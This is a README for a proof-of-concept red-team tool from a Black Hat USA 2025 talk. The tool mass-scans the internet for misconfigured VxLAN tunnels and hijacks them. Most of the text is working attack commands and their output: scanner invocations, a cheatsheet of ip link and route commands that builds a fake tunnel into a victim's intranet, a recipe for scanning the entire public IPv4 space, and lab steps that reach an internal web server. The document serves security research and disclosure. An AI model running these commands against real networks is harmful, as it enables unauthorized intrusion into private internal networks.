# VxLAN Tunnel Scanner
- A scanner that searches for misconfigured VxLAN tunnels around the world and can potentially hijack entire tunnel access to internal networks.
## Reference
- This is a PoC code for Black Hat USA 2025 Briefing: [From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678) 
## Prepare
- `pip3 install requirement.txt`
## Usage
```
python3 main.py -i <interface> -l <your_public_IP> -d <VxLAN_dst_ip_subnet or ip_list_file>
```
## Example
- for example `1.1.1.1` has VxLAN tunnel you are `3.3.3.3`, and VNI might be 1 to 100
```
python3 main.py -i eth0 -l 3.3.3.3 -d 1.1.1.1 -vni 1:100 -p 4789,8472
CRITICAL - Received reply from Source IP: 1.1.1.1, VNI: 42, VXLAN Port: 8472, VXLAN Source Mac: ee:bb:cc:aa:55:11, VXLAN Source IP: 10.0.0.1
```
- And get how to abuse VxLAN tunnel
```
python3 main.py -l 3.3.3.3 -d 1.1.1.1 -vni 42 -p 8472 -sch -tip 10.0.0.2/24 -tvip 10.0.0.1
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=vxlan-test
MYPUBIP=3.3.3.3
DSTADDR=1.1.1.1
TIP=10.0.0.2/24
TVIP=10.0.0.1
DPORT=8472
VID=42
ip link add $IFACE type vxlan id $VID remote $DSTADDR local $MYPUBIP dstport $DPORT 
ip link set up dev $IFACE
ip addr add $TIP dev $IFACE
## route possible private ip ##
ip r add 10.0.0.0/8 via $TVIP dev $IFACE src $MYPUBIP
ip r add 172.16.0.0/12 via $TVIP dev $IFACE src $MYPUBIP
ip r add 192.168.0.0/16 via $TVIP dev $IFACE src $MYPUBIP

### start scan intranet ###
#### !IMPORTANT! ####
# !! nmap is not available for this kind of attack use fping instead !! #
# fping -g 192.168.0.0/16 2>/dev/null

#### cleanup ####
ip link del $IFACE
```
- default setting about 500 package/sec.

## options
- `-sch`: Show Cheetsheet and exit (Input -i -l -d which you found then get abuse VxLAN tunnel command)
- `-l3`: Layer 3 tunnel interface (Default: False)
- `-vni`: Scan VXLAN VNI range in the form of '1:10', '1', or '1,4' (default 1:200)
- `-p` Scan VXLAN VNI range in the form of '1:10', '1', or '1,4' (default 1:200)
- `-ss`: Save and use status file (the last scan will resume) (Default: False)
  - Recommend "on" in mass scan system sometime kill the script
- `-i <interface>`: Interface to send package
- `-d <ip_or_file>`: A IP subnet or a list of IPs(subnets) to use as VxLAN dst
- `-l <ip>`: A IP on your pubilc interface (the IP on -i interface)
- `-o <file>`: Log file path
- `-t <float>`: Wait how many second after VxLAN packet send (Default: 2)
- `-T <int>`: How many thread send VxLAN packet in same time (Default: 255)
- `-cs <int>`: Send how many ip until start wait for ping to responsed (default: 1000)
- `-dp`: Do private - scan private ip VxLAN (Default: False)
  - Use this if you know the inside intranet address
- `-v <log_level>`: Logging level `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (Default: INFO)
  - VxLAN peer found log is on `CRITICAL`
- `-tip` : tunnel address **inference** from scan result, **contains subnets** (for cheet sheet only)
- `-tvip` : Victim tunnel address from scan result (for cheet sheet only)


## better way to scan full public ip
```
wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i <interface> -l <your_public_IP> -d aggrv4table.txt -ss
```

## Lab
### Scan VxLAN tunnel
```
python3 main.py -i <iface> -l <your_ip> -d 160.25.104.200
CRITICAL - Received reply from Source IP: 160.25.104.200, VNI: 42, VXLAN Port:8472, VXLAN Source Mac: fa:10:04:a1:e1:cf, VXLAN Source IP: 10.0.0.1
```
### Access & Scan intranet
```
python3 main.py -l 9.9.9.9 -d 160.25.104.200 -vni 42 -p 8472 -sch -tip 10.0.0.2/24 -tvip 10.0.0.1
#### Create Fake Tunnel ####
MYPUBIP=9.9.9.9  #change this
DSTADDR=160.25.104.200
DPORT=8472
VID=42
IF_NAME=vxlan-test
ip link add $IF_NAME type vxlan id $VID remote $DSTADDR local $MYPUBIP dstport $DPORT 
ip link set up dev $IF_NAME
ip addr add 10.0.0.2/24 dev $IF_NAME
ping -c 1 10.0.0.1
ip r add 192.168.122.0/24 via 10.0.0.1

### start scan intranet ###
# nmap 192.168.122.0/24
ping -c 1 192.168.122.20

## test curl to web ##
curl 192.168.122.20
# YOU KNOW VxLAN!

#### cleanup ####
ip link del $IF_NAME
```

## Disclaimer
This project is intended for educational and research purposes only. Any actions and/or activities related to this code are solely your responsibility. The authors and contributors are not responsible for any misuse or damage caused by this project. Please ensure that you have proper authorization before testing, using, or deploying any part of this code in any environment. Unauthorized use of this code may violate local, state, and federal laws.

## License
This project is licensed under the terms of the MIT license.
